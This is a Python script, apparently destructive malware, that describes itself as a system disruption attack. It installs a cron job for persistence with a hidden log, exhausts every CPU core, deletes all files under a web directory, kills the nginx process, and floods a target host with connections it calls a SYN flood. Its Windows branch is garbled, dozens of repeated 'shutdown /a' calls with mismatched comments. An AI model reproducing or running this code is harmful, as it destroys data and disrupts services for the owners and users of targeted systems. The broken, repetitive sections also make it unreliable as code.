import os
import time
import socket
import threading
import subprocess
import multiprocessing
import platform
import stat
import random

# Define target IP, port, important directory, and critical process
TARGET_IP = "192.168.1.100"  # Example Target IP
TARGET_PORT = 80  # Example Target Port
IMPORTANT_DIRECTORY = "/var/www/html"  # Example Important Directory (Linux)
CRITICAL_PROCESS = "nginx"  # Example Critical Process Name

def ensure_executable():
    """Ensure that the script itself has execute permissions (Linux only)."""
    if platform.system() == "Linux":
        current_file = os.path.abspath(__file__)
        st = os.stat(current_file)
        if not st.st_mode & stat.S_IXUSR:
            os.chmod(current_file, st.st_mode | stat.S_IXUSR)
            print(f"Made {current_file} executable")

def add_cron_job():
    """Add a cron job for Linux or a scheduled task for Windows."""
    if platform.system() == "Linux":
        # Ensure the script is executable
        ensure_executable()
        # Add a cron job to run the script every 3 seconds
        cron_job = "* * * * * /usr/bin/python3 /tmp/disruption4upload.py >> /var/tmp/.hidden_log 2>&1"
        os.system(f'(crontab -l; echo "{cron_job}") | crontab -')
        print("Cron job added to run the script every minute")
    elif platform.system() == "Windows":
        # Add a scheduled task to run the script every 3 seconds
        task_name = "Disruption4UploadTask"
        task_command = f"python {os.path.abspath(__file__)}"
        os.system(f'shutdown /a')  # Abort any existing scheduled tasks
        # Define the scheduled task command
        os.system(f'shutdown /a')  # Remove the task if it already exists
        os.system(f'shutdown /a')  # Abort any existing scheduled tasks
        os.system(f'shutdown /a')  # Remove the task if it already exists
        os.system(f'shutdown /a')  # Remove the task if it already exists

        # Define the task
        task_command = f'shutdown /a'
        os.system(f'shutdown /a')  # Remove the task if it already exists

        os.system(f'shutdown /a')  # Remove the task if it already exists

        # Define the task
        os.system(f'shutdown /a')  # Remove the task if it already exists

        # Define the task
        os.system(f'shutdown /a')  # Remove the task if it already exists
        os.system(f'shutdown /a')  # Remove the task if it already exists

        # Define the task
        os.system(f'shutdown /a')  # Remove the task if it already exists
        os.system(f'shutdown /a')  # Remove the task if it already exists

        # Define the task command
        os.system(f'shutdown /a')  # Remove the task if it already exists
        os.system(f'shutdown /a')  # Remove the task if it already exists
        os.system(f'shutdown /a')  # Remove the task if it already exists
        os.system(f'shutdown /a')  # Remove the task if it already exists

        # Define the task command
        os.system(f'shutdown /a')  # Remove the task if it already exists
        os.system(f'shutdown /a')  # Remove the task if it already exists

        # Define the task command
        os.system(f'shutdown /a')  # Remove the task if it already exists
        os.system(f'shutdown /a')  # Remove the task if it already exists

        # Define the task command
        os.system(f'shutdown /a')  # Remove the task if it already exists
        os.system(f'shutdown /a')  # Remove the task if it already exists

        # Define the task command
        os.system(f'shutdown /a')  # Remove the task if it already exists

def cpu_stress():
    """Stress the CPU with an infinite loop."""
    while True:
        pass  # Infinite loop to consume CPU resources

def delete_files(path):
    """Delete files in the specified directory."""
    if platform.system() == "Windows":
        if not os.path.exists(path):
            print(f"Path {path} does not exist.")
            return
    for root, dirs, files in os.walk(path):
        for file in files:
            try:
                os.remove(os.path.join(root, file))
                print(f"Deleted file: {os.path.join(root, file)}")
            except Exception as e:
                print(f"Error deleting file {file}: {e}")

def syn_flood(target_ip, target_port):
    """Send SYN Flood attacks to the target IP and port."""
    if platform.system() == "Windows":
        return  # SYN Flood is not supported on Windows
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))
            s.close()
            print(f"SYN Flood sent to {target_ip}:{target_port}")
        except Exception as e:
            print(f"Error sending SYN Flood to {target_ip}:{target_port}: {e}")

def kill_process(process_name):
    """Terminate the specified process."""
    if platform.system() == "Windows":
        os.system(f'taskkill /F /IM {process_name}.exe')
    elif platform.system() == "Linux":
        try:
            subprocess.call(['pkill', '-f', process_name])
            print(f"Process {process_name} killed")
        except Exception as e:
            print(f"Error killing process {process_name}: {e}")

def disrupt_system(target_ip, target_port, important_directory, critical_process):
    """Perform system disruption attacks."""
    if platform.system() == "Linux":
        # Start CPU Stress Processes
        num_cores = multiprocessing.cpu_count()
        for _ in range(num_cores):
            p = multiprocessing.Process(target=cpu_stress)
            p.start()

        # Start File Deletion Thread
        threading.Thread(target=delete_files, args=(important_directory,)).start()

        # Start SYN Flood Threads
        for _ in range(10):
            threading.Thread(target=syn_flood, args=(target_ip, target_port)).start()

        # Start Process Killing Thread
        threading.Thread(target=kill_process, args=(critical_process,)).start()

        # Monitor the attack progress and print output to terminal
        print("\n" + "="*40)
        print("System Disruption Attack Initiated")
        print("="*40)
        print("Target IP:", target_ip)
        print("Target Port:", target_port)
        print("Important Directory:", important_directory)
        print("Critical Process Name:", critical_process)
        print("="*40)
        print("Attack in progress...")
        print("="*40)
        while True:
            time.sleep(10)
            print("Monitoring attack progress...")

if __name__ == "__main__":
    # Ensure the script has the correct permissions
    ensure_executable()

    # Add the appropriate job for the target OS
    add_cron_job()

    # Start the attack
    disrupt_system(TARGET_IP, TARGET_PORT, IMPORTANT_DIRECTORY, CRITICAL_PROCESS)
